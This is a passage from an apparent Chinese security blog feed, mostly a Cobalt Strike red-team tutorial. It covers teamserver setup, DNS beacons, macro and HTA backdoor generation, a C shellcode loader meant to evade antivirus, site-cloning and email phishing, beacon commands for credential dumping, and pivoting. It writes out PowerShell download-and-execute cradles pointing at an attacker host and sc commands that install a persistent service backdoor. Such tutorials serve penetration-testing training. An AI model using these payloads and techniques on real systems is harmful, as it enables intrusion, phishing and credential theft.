alt="image-20220525171156276"></p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobalt strike</title>
      <link href="/2022/04/17/day44/"/>
      <url>/2022/04/17/day44/</url>
      
        <content type="html"><![CDATA[<h1 id="cobalt-strike"><a href="#cobalt-strike" class="headerlink" title="cobalt strike"></a>cobalt strike</h1><span id="more"></span><h2 id="cobalt-strike介绍"><a href="#cobalt-strike介绍" class="headerlink" title="cobalt strike介绍"></a>cobalt strike介绍</h2><p>Cobalt Strike是一款基于java的渗透测试神器，常被业界人称为CS神器。分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。</p><p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><pre class="line-numbers language-none"><code class="language-none">│ agscript 拓展应用的脚本 │ c2lint 检查profile的错误异常 │ cobaltstrike │ cobaltstrike.jar 客户端程序 │ icon.jpg │ license.pdf │ readme.txt │ releasenotes.txt│ teamserver 服务端程序│ update │ update.jar │└─third-party 第三方工具         README.vncdll.txt         vncdll.x64.dll         vncdll.x86.dll <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="个人定制"><a href="#个人定制" class="headerlink" title="个人定制"></a>个人定制</h3><ul><li><p>Cobalt Strike可以使用 AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提</p><p>权脚本等</p></li><li><p>Cobalt Strike通信配置文件是 Malleable C2 ，可以修改 CS的通讯特征，Beacon payload的一些行</p><p>为</p></li><li><p>Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范/</p><p>框架，它允许黑客根据需要对框架提供的默认HTTP(S)/DNS/SMB C2 通信通道进行扩展。</p></li></ul><h3 id="启动运行"><a href="#启动运行" class="headerlink" title="启动运行"></a>启动运行</h3><blockquote><p>服务端跟客户端好像需要在同一网段，不然会超时，但是没有多次尝试来验证</p><p>有时候客户端启动白屏，可能是输入法问题，切换输入法试试。</p><p>或者有时候打开白屏，再打开就正常了</p></blockquote><p>服务器放在Linux平台上，服务端关键文件是teamserver和cobaltstrike.jar，将这俩个文件放在同一个目录执行</p><pre class="line-numbers language-none"><code class="language-none">sudo ./teamserver <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一些参数</p><pre class="line-numbers language-none"><code class="language-none">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD] &lt;host&gt; 必需参数 团队服务器IP &lt;password&gt; 必需参数 连接服务器的密码 [/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性 [YYYY-MM-DD] 可选参数 所有payload的终止时间 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>密码设置成强密码，不然容易被爆破</p><p>在目录下查看文件权限，teamserver需要执行权限</p><pre class="line-numbers language-none"><code class="language-none">ls -al <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果出错可赋予teamserver执行权限</p><p><img src="/2022/04/17/day44/image-20220417164447250.png" alt="image-20220417164447250"></p><p>之后客户端连接即可</p><p><img src="/2022/04/17/day44/image-20220417164916991.png" alt="image-20220417164916991"></p><p>也可在kali连接，同样需要赋予执行权限</p><pre class="line-numbers language-none"><code class="language-none">sudo ./cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220417170039695.png" alt="image-20220417170039695"></p><p>但是上面的命令启动如果窗口关闭，teamserver会自动关闭，可以使用nohub命令设置后台启动</p><pre class="line-numbers language-none"><code class="language-none">sudo nohup ./teamserver 192.168.0.180 123456 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220417165607050.png" alt="image-20220417165607050"></p><p>可通过查看端口判断服务端是否启动</p><pre class="line-numbers language-none"><code class="language-none">netstat -anpt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以查看此进程</p><pre class="line-numbers language-none"><code class="language-none">ps aux |grep teamserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以kill掉进程来关闭teamserver</p><pre class="line-numbers language-none"><code class="language-none">sudo kill num<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以通过修改teamserver来修改端口等信息</p><pre class="line-numbers language-none"><code class="language-none">sudo vi teamserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220417165802520.png" alt="image-20220417165802520"></p><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>在连接服务端后，首先创建监听器</p><p>监听器payload支持多种协议</p><p><img src="/2022/04/17/day44/image-20220417172228172.png" alt="image-20220417172228172"></p><p>beacon是cobalt strike的内置监听器 包括dns、http、https、smb四种方式的监听器 foreign为外部监听器，配合Metasploit或者Armitage的监听器。</p><p>地址巡回策略</p><table><thead><tr><th>round-robin</th><th>按主机名的顺序循环浏览主机名列表</th></tr></thead><tbody><tr><td>random</td><td>每次访问时，从列表中随机选择一个主机名 已尝试连接。</td></tr><tr><td>failover-xx</td><td>使用每台主机一段时间。指定的持续时间（m、h、d），然后使用下一个主机。</td></tr></tbody></table><p>http地址（stager）这个可以填写ip本身 也可以填写多个域名 但是这个域名解析必须是teamserver的地址。</p><p>在dns增加多条a记录均指向teamserver的ip</p><p><img src="/2022/04/17/day44/image-20220417175630325.png" alt="image-20220417175630325"></p><p>添加三条记录</p><p><img src="/2022/04/17/day44/image-20220417175701708.png" alt="image-20220417175701708"></p><p>host是teamserver的地址 stager可以填写多个域名 可以使用随机 提供多个域名访问teamserver</p><p><img src="/2022/04/17/day44/image-20220417175839909.png" alt="image-20220417175839909"></p><p>使用wireshark抓包分析</p><p>上线分析，因为是random，可看到一个随机的域名解析</p><p><img src="/2022/04/17/day44/image-20220417181127101.png" alt="image-20220417181127101"></p><p>使用 攻击 -&gt;生成后门-&gt;windows可执行程序 选择好监听器 生成后门上线</p><p><img src="/2022/04/17/day44/image-20220417172719718.png" alt="image-20220417172719718"></p><p>之后目标运行后即可上线</p><p><img src="/2022/04/17/day44/image-20220417173400645.png" alt="image-20220417173400645"></p><p>也可使用web投递方式上线</p><p><img src="/2022/04/17/day44/image-20220417173504962.png" alt="image-20220417173504962"></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.180:80/a'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标运行后也可上线</p><p><img src="/2022/04/17/day44/image-20220417173554725.png" alt="image-20220417173554725"></p><p><img src="/2022/04/17/day44/image-20220417173612010.png" alt="image-20220417173612010"></p><h2 id="colbat-strike-dns-上线"><a href="#colbat-strike-dns-上线" class="headerlink" title="colbat strike dns 上线"></a>colbat strike dns 上线</h2><p>在内网使用时，如果防护墙只允许dns出网，可以使用dns后门上线，cs里内置dns上线模块</p><p>nslookup <a href="http://www.baidu.com/">www.baidu.com</a> 查询dns是否出网，发现dns可以出网</p><p><img src="/2022/04/17/day44/image-20220422155329752.png" alt="image-20220422155329752"></p><p>准备域名，设置 ns记录和a记录，并且把ns记录指向a记录</p><p><img src="/2022/04/17/day44/image-20220422155854857.png" alt="image-20220422155854857"></p><p>在公网的VPS里，启动服务端放在后台</p><pre class="line-numbers language-none"><code class="language-none">nohup ./teamserver 10.68.3.12 QWEasd55aa &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建立dns监听器</p><p><img src="/2022/04/17/day44/image-20220422161112090.png" alt="image-20220422161112090"></p><p>因为dns的默认端口是53端口 在ubuntu的53端口默认是开启的，如果出现占用情况，在ubantu中先把53端口关闭</p><pre class="line-numbers language-none"><code class="language-none">systemctl stop systemd-resolved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用web传递，目标执行后上线是一个黑色图标。</p><p>右键选择会话交互使用命令 checkin，强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）</p><p><img src="/2022/04/17/day44/image-20220422161445753.png" alt="image-20220422161445753"></p><p>执行完之可以获得上线的一些信息</p><p><img src="/2022/04/17/day44/image-20220422161905922.png" alt="image-20220422161905922"></p><blockquote><p>在beacon支持三种dns执行命令方式 一般使用dns-txt较多</p><p>mode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）<br>mode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）<br>mode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）</p></blockquote><p><img src="/2022/04/17/day44/image-20220422162015026.png" alt="image-20220422162015026"></p><h2 id="生成后门模块使用"><a href="#生成后门模块使用" class="headerlink" title="生成后门模块使用"></a>生成后门模块使用</h2><p>生成后门界面有以下模块：</p><p><img src="/2022/04/17/day44/image-20220424095606186.png" alt="image-20220424095606186"></p><h3 id="HTA文档"><a href="#HTA文档" class="headerlink" title="HTA文档"></a>HTA文档</h3><p>提供了3种生成方式 exe,powershell,vba。</p><p>其中VBA方法需要目标系统上的MicrosoftOffice，在系统支持的情况下我们一般选择powershell，因为这种方式更加容易免杀。通常我们结合host File(文件下载功能) 来实行钓鱼。</p><p><img src="/2022/04/17/day44/image-20220424104945247.png" alt="image-20220424104945247"></p><p>目标运行hta文件之后，可以上线。</p><p>我们一般配合文件托管使用。</p><p><img src="/2022/04/17/day44/image-20220424105154941.png" alt="image-20220424105154941"></p><p>改名为hta文件</p><p><img src="/2022/04/17/day44/image-20220424105240095.png" alt="image-20220424105240095"></p><p>目标在点击url后下载运行文件后，我们上线。</p><p><img src="/2022/04/17/day44/image-20220424105318345.png" alt="image-20220424105318345"></p><p><img src="/2022/04/17/day44/image-20220424105443998.png" alt="image-20220424105443998"></p><h3 id="office宏"><a href="#office宏" class="headerlink" title="office宏"></a>office宏</h3><p>将生成的宏文件    放在word文档，文档可以执行宏时，自动执行</p><p><img src="/2022/04/17/day44/image-20220424105833741.png" alt="image-20220424105833741"></p><p>选择监听器后，出现宏文档创建步骤</p><p><img src="/2022/04/17/day44/image-20220424105839317.png" alt="image-20220424105839317"></p><p>新建一个word文档，开发工具-&gt;宏-&gt;任意宏名-&gt;选择宏位置</p><p><img src="/2022/04/17/day44/image-20220424130832579.png" alt="image-20220424130832579"></p><p>将生成的宏代码替换</p><p><img src="/2022/04/17/day44/image-20220424131009589.png" alt="image-20220424131009589"></p><p>选择否-&gt;选择宏可用文件</p><p><img src="/2022/04/17/day44/image-20220424131114003.png" alt="image-20220424131114003"></p><p>之后会生成宏可用文件docm，启用宏，我们可以得到一个session，就上线了</p><p><img src="/2022/04/17/day44/image-20220512152721379.png" alt="image-20220512152721379"></p><p><img src="/2022/04/17/day44/image-20220512153914203.png" alt="image-20220512153914203"></p><h3 id="pyaload生成器"><a href="#pyaload生成器" class="headerlink" title="pyaload生成器"></a>pyaload生成器</h3><p>cs里提供一个payload生成器，因为默认的shellcode容易被杀毒软件发现，可以编写shellcode加载器运行payload 达到免杀的效果</p><p><img src="/2022/04/17/day44/image-20220512153001849.png" alt="image-20220512153001849"></p><p>点击之后可以选择监听器以及输出格式，输出格式取决于 shellcode运行器类型。</p><p><img src="/2022/04/17/day44/image-20220512154031651.png" alt="image-20220512154031651"></p><p>点击generate，选择好路径，就可以生成shellcode</p><p><img src="/2022/04/17/day44/image-20220512154226012.png" alt="image-20220512154226012"></p><p>payload.c里面就是我们的shellcode</p><p><img src="/2022/04/17/day44/image-20220512154257236.png" alt="image-20220512154257236"></p><p>c/c++加载器</p><pre class="line-numbers language-none"><code class="language-none">\#include &lt;windows.h&gt; \#include &lt;stdio.h&gt; \#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示 窗口这里是shellcode代码void main() { LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (Memory == NULL) { return; } memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)(); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们打开vs studio</p><h3 id="windows可执行程序"><a href="#windows可执行程序" class="headerlink" title="windows可执行程序"></a>windows可执行程序</h3><p><img src="/2022/04/17/day44/image-20220512160738055.png" alt="image-20220512160738055"></p><p>点击之后，进入配置页面，</p><p>提供三种输出类型：</p><ul><li>windows可执行程序，双击运行</li><li>windows服务程序，可使用sc命令制作为服务程序，这是cs留后门的一种方法</li><li>windows dll文件</li></ul><p><img src="/2022/04/17/day44/image-20220512160802267.png" alt="image-20220512160802267"></p><h4 id="windows-exe"><a href="#windows-exe" class="headerlink" title="windows exe"></a>windows exe</h4><p>目标运行exe即可上线</p><h4 id="windows-service-exe"><a href="#windows-service-exe" class="headerlink" title="windows service exe"></a>windows service exe</h4><p>选择监听器生成service1.exe，服务后门。</p><p>上传后门到目标，user那里有*表示我们可以完全控制机器。</p><p><img src="/2022/04/17/day44/image-20220512162006527.png" alt="image-20220512162006527"></p><p>返回beacon，使用命令</p><p>创建服务server1，=后必须有空格</p><pre class="line-numbers language-none"><code class="language-none">shell sc create "server1" binpath= "C:\Windows\Temp\service1.exe" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220512162437709.png" alt="image-20220512162437709"></p><p>给服务添加描述，可加可不加</p><pre class="line-numbers language-none"><code class="language-none">shell sc description "server1" "description" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置服务自启动</p><pre class="line-numbers language-none"><code class="language-none">shell sc config "server1" start= auto <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动服务，权限提升到system</p><pre class="line-numbers language-none"><code class="language-none">shell net start "server1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220512164038743.png" alt="image-20220512164038743"></p><h3 id="windwos可执行程序-（Stageless）"><a href="#windwos可执行程序-（Stageless）" class="headerlink" title="windwos可执行程序 （Stageless）"></a>windwos可执行程序 （Stageless）</h3><p><img src="/2022/04/17/day44/image-20220512164803335.png" alt="image-20220512164803335"></p><p>Staged 和 Stageless 的区别:</p><p>前者的实际功能只是和 C2 建立连接并接收 Payload, 然后加载执行, </p><p>Stageless 直接省去了接收 Payload 的步骤。Stageless 生成的 Payload 都会比 Staged 的要大很多,，而且包含了特征明细。</p><h2 id="钓鱼模块"><a href="#钓鱼模块" class="headerlink" title="钓鱼模块"></a>钓鱼模块</h2><p>cs提供钓鱼模块，方便渗透。</p><p>主要有：站点管理、网站克隆、文件托管、web投递、签名applet攻击、智能applet攻击、信息搜集。</p><p><img src="/2022/04/17/day44/image-20220512165137044.png" alt="image-20220512165137044"></p><h3 id="站点管理"><a href="#站点管理" class="headerlink" title="站点管理"></a>站点管理</h3><p>对开启的web服务进行管理，我们生成的一些文件会在这里存储</p><p><img src="/2022/04/17/day44/image-20220512165436538.png" alt="image-20220512165436538"></p><h3 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h3><p>克隆一个网站，发送给受害者，收集受害者提交的信息，可以选择攻击下载文件，也可以开启键盘记录。</p><p><img src="/2022/04/17/day44/image-20220512171124746.png" alt="image-20220512171124746"></p><p>可以在站点管理看到克隆的网站</p><p><img src="/2022/04/17/day44/image-20220512171314191.png" alt="image-20220512171314191"></p><p>受害者访问此url，可看到界面跟克隆的网站相同</p><p><img src="/2022/04/17/day44/image-20220512171436580.png" alt="image-20220512171436580"></p><p>可在视图里的web日志看到受害者信息，如果选择了攻击，用户会在访问网站时，自动弹出下载文件，执行之后我们可以获取到session</p><p><img src="/2022/04/17/day44/image-20220512171733912.png" alt="image-20220512171733912"></p><h3 id="文件托管"><a href="#文件托管" class="headerlink" title="文件托管"></a>文件托管</h3><p>文件托管可以将后门文件托管到一个url，目标访问之后自动下载文件，执行之后我们可以获取session</p><p><img src="/2022/04/17/day44/image-20220512172332457.png" alt="image-20220512172332457"></p><h3 id="web投递"><a href="#web投递" class="headerlink" title="web投递"></a>web投递</h3><p>提供一个攻击载荷，目标运行之后我们可以获取session</p><p><img src="/2022/04/17/day44/image-20220512172646122.png" alt="image-20220512172646122"></p><p>这是生成的payload，用户执行之后我们可以获取session</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.68.4.155:80/a'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>生成一个页面，搜集目标浏览器系统信息，可以设置跳转url，比如设置一个钓鱼的url。</p><p><img src="/2022/04/17/day44/image-20220512173019355.png" alt="image-20220512173019355"></p><p>用户访问改url之后可以在web日志里面查看搜集到的信息。</p><h3 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h3><p><img src="/2022/04/17/day44/image-20220513141827378.png" alt="image-20220513141827378"></p><p>点击之后进入配置页面，分别为目标、模板、附件、嵌入url、邮件服务器、退信通知邮箱</p><p><img src="/2022/04/17/day44/image-20220513141907258.png" alt="image-20220513141907258"></p><p>目标我们可以准备一个user.txt文件，写入目标邮箱地址</p><p>模板我们可以使用eml文件，这个可以在qq邮箱导出</p><p><img src="/2022/04/17/day44/image-20220513142147451.png" alt="image-20220513142147451"></p><p>附件我们可以把后门放进来</p><p>嵌入url是目标在点击邮箱的url之后会自动跳转，我们可以放入钓鱼网站的url</p><h2 id="beacon使用"><a href="#beacon使用" class="headerlink" title="beacon使用"></a>beacon使用</h2><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从 父Beacon获取到任务并发送。</p><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p><p>smb beacon的工作流程</p><p><img src="/2022/04/17/day44/image-20220513151259621.png" alt="image-20220513151259621"></p><p>拿到一个session后，右键点击interact进入交互页面，可以使用beacon命令</p><p><img src="/2022/04/17/day44/image-20220513144659084.png" alt="image-20220513144659084"></p><p>输入help可以查看帮助文档</p><pre class="line-numbers language-none"><code class="language-none">Command Description ------- -----------argue 命令行参数欺骗 blockdlls 禁止子进程加载非微软签名的dll browserpivot 注入浏览器进程代理用户已认证身份（仅支持IE） cancel 取消正在下载的文件 cd 跳转目录 checkin 强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver） chromedump 提取Chrome保存的账号密码、Cookies等信息 clear 清空beacon任务队列 connect 通过TCP正向连接远程Beacon covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从域控提取密码hash desktop 远程VNC控制用户桌面 dllinject 注入一个内存反射加载的dll到目标进程 dllload 使用LoadLibrary方式在目标进程中加载一个dll download 下载文件 downloads 列出所有正在下载的文件 drives 列出所有磁盘盘符 elevate 利用提权漏洞获取一个高权限Beacon execute 在目标上执行程序（无回显） execute-assembly 在目标上内存加载执行本地.NET程序 exit 结束当前Beacon会话 getprivs 在当前进程访问令牌（access token）中启用system特权 getsystem 尝试获取SYSTEM用户权限 getuid 获取当前进程访问令牌（access token）的用户信息 hashdump 获取本地用户hash help 帮助信息 inject 在指定进程中注入新的Beacon会话 inline-execute 在当前会话中执行Beacon Object File jobkill 结束一个后台任务 jobs 列出所有后台任务 jump 在远程机器上植入Beacon（横向移动） kerberos_ccache_use 从ccache文件导入kerberos票据到当前会话中kerberos_ticket_purge 清空当前会话中的所有kerberos票据 kerberos_ticket_use 从ticket文件中导入kerberos票据到当前会话中 keylogger 开启键盘记录 kill 结束指定进程 link 通过命名管道正向连接远程Beacon logonpasswords 使用mimikatz获取密码和hash ls 列出目录文件 make_token 创建进程访问令牌（access token），仅用于访问网络资源 mimikatz 运行mimikatz mkdir 创建目录 mode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon） mode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon） mode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon） mv 移动文件 net 网络和主机探测工具（内置net命令） note 给当前会话添加备注信息 portscan 网络端口扫描 powerpick 内存执行Powershell命令（不调用powershell.exe） powershell 通过powershell.exe执行Powershell命令 powershell-import 导入本地powershell脚本到当前会话中 ppid 为所有新运行的进程设置伪造的父进程PID printscreen 使用PrintScr方式截屏 ps 显示进程列表 psinject 注入到指定进程后在内存中执行Powershell命令（不调用 powershell.exe) pth 使用Mimikatz执行Pass-the-hash pwd 显示当前目录 reg 查询注册表 remote-exec 在远程机器上执行命令（横向移动） rev2self 恢复原始进程访问令牌（access token） rm 删除文件或文件夹 rportfwd 反向端口转发（从Cobalt Strike Teamserver发起连接） rportfwd_local 反向端口转发（从Cobalt Strike客户端发起连接） run 在目标上执行程序（有回显） runas 以另一个用户身份执行程序 runasadmin 以高权限执行程序 runu 以另一个进程PID作为父进程PID，并以其用户身份执行程序 screenshot 截屏 screenwatch 屏幕监控，每隔一段时间截屏 setenv 设置环境变量 shell 使用cmd.exe执行命令 shinject 注入shellcode到指定进程中 shspawn 创建傀儡进程并注入shellcode到其中运行 sleep 设置beacon回连间隔时间 socks 启动SOCKS4a代理服务器 socks stop 停止SOCKS4a代理服务器 spawn 创建一个新Beacon会话 spawnas 以另一个用户身份创建一个新Beacon会话 spawnto 设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）spawnu 以另一个进程PID作为父进程PID，并以其用户身份创建一个新 Beacon会话 spunnel 运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike Teamserver发起连接） spunnel_local 运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike客户端发起连接） ssh 通过SSH连接远程主机（使用账号密码认证） ssh-key 通过SSH连接远程主机（使用证书私钥认证）steal_token 从指定进程中窃取访问令牌（access token) timestomp 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造） unlink 断开与beacon的连接（用于通过TCP、命名管道连接的beacon） upload 上传文件 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h2><h3 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h3><p>teamserver 192.168.234.128</p><p>12server5 192.168.234.129 10.10.10.139</p><p>12server4 10.10.10.138</p><p>拿到session后，修改回连间隔，进入beacon交互</p><p><img src="/2022/04/17/day44/image-20220513154259662.png" alt="image-20220513154259662"></p><p>使用socks设置1080端口代理</p><pre class="line-numbers language-none"><code class="language-none">socks 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220513154337135.png" alt="image-20220513154337135"></p><p>看到这里使用的是socks4a，修改proxychains4.conf文件，让工具走这条隧道</p><pre class="line-numbers language-none"><code class="language-none">sudo vi /etc/proxychains4.conf  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220513155128356.png" alt="image-20220513155128356"></p><p>比如我们使用nmap ，利用proxychain走这条隧道进行扫描。</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 nmap 10.10.10.138 -sT -A -p 445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220513155113008.png" alt="image-20220513155113008"></p><p>可看到成功通过这条隧道访问到了内网。</p><h3 id="转发上线"><a href="#转发上线" class="headerlink" title="转发上线"></a>转发上线</h3><p>转发监听器可以利用已攻陷的机器作为代理，为其他Beacon会话中转网络流量，即内网其他机器可通过连接攻陷机器上线。 </p><p>teamserver 192.168.234.128</p><p>12server5 192.168.234.129 10.10.10.139</p><p>12server4 10.10.10.138</p><p>利用获取的session，右键-&gt;pivoting-&gt;listener，新建监听器</p><p><img src="/2022/04/17/day44/image-20220513155338784.png" alt="image-20220513155338784"></p><p>监听器使用当前会话</p><p><img src="/2022/04/17/day44/image-20220513155445288.png" alt="image-20220513155445288"></p><p>点击保存之后，beacon中可看到执行代码，所以也可以在beacon中使用。</p><p><img src="/2022/04/17/day44/image-20220513155719481.png" alt="image-20220513155719481"></p><p>接着生成后门，attacks -&gt;packages-&gt;windows-&gt;executable(s)，选择rve，</p><p><img src="/2022/04/17/day44/image-20220513155959919.png" alt="image-20220513155959919"></p><p>如果选择上面的windows可执行程序会发现没有刚才新建的监听器，之后生成beacon.exe后门</p><p><img src="/2022/04/17/day44/image-20220513160322149.png" alt="image-20220513160322149"></p><p>接下来如果内网目标点击了这个可执行程序，我们就可以获取到session</p><p>可看到内网主机与攻击机不互通</p><p><img src="/2022/04/17/day44/image-20220513162117214.png" alt="image-20220513162117214"></p><p>目标运行beacon之后，我们获取到了session，获取到的session会有圈圈。</p><p><img src="/2022/04/17/day44/image-20220513162048935.png" alt="image-20220513162048935"></p><p>点击视图查看</p><p><img src="/2022/04/17/day44/image-20220513162247483.png" alt="image-20220513162247483"></p><h3 id="VPN部署"><a href="#VPN部署" class="headerlink" title="VPN部署"></a>VPN部署</h3><p>为CovertVPN新建一个虚拟机网卡和监听器，当部署CovertVPN客户端后，你将相当于在目标网络中拥有一个二层网络的tap接口 </p><p>右键获取到的session-&gt;pivoting-&gt; deploy vpn，部署vpn</p><p><img src="/2022/04/17/day44/image-20220513163111426.png" alt="image-20220513163111426"></p><p>点击之后可看到目标的俩块网卡，选择内网网卡，点击add，点击部署</p><p><img src="/2022/04/17/day44/image-20220513163225480.png" alt="image-20220513163225480"></p><p>beacon也执行了相关命令</p><p><img src="/2022/04/17/day44/image-20220513163322154.png" alt="image-20220513163322154"></p><p>也可以在cobalt strike-vpn interface这里查看配置的vpn</p><p><img src="/2022/04/17/day44/image-20220513163351185.png" alt="image-20220513163351185"></p><p>kali执行，尝试分配ip，这里看到已经有了内网段的ip</p><pre class="line-numbers language-none"><code class="language-none">sudo ifconfig phear1 10.10.10.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220513164333076.png" alt="image-20220513164333076"></p><p>试着使用nmap扫描内网段</p><pre class="line-numbers language-none"><code class="language-none">nmap -sT -Pn 10.10.10.138 -p 445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220513164813381.png" alt="image-20220513164813381"></p><p>可看到直接扫描已经可以了，说明我们攻击机的流量进入到了内网</p><p>返回到cs查看，可看到有流量在跑</p><p><img src="/2022/04/17/day44/image-20220513164846486.png" alt="image-20220513164846486"></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>Cobalt Strike 的 Beacon 最初是一个稳定的生命线，让你可以保持对受害主机的访问权限。从一开始，Beacon 的主要目的就是向其他的 Cobalt Strike 监听器传递权限。</p><p>使用 spawn 命令来为一个监听器派生一个会话。此 spawn 命令接受一个架构（如：x86，x64）和一个监听器作为其参数。默认情况下， spawn 命令会在 rundll32.exe 中派生一个会话。</p><h3 id="spawn会话"><a href="#spawn会话" class="headerlink" title="spawn会话"></a>spawn会话</h3><p>可以使用spawn命令派生一个会话，帮助文档如下</p><p><img src="/2022/04/17/day44/image-20220516165040686.png" alt="image-20220516165040686"></p><p>我们新建一个监听器，选择beacon https，默认端口就为443</p><p><img src="/2022/04/17/day44/image-20220516165202797.png" alt="image-20220516165202797"></p><p>右键会话，点击spawn，选择刚才新建的beacon-https监听器</p><p><img 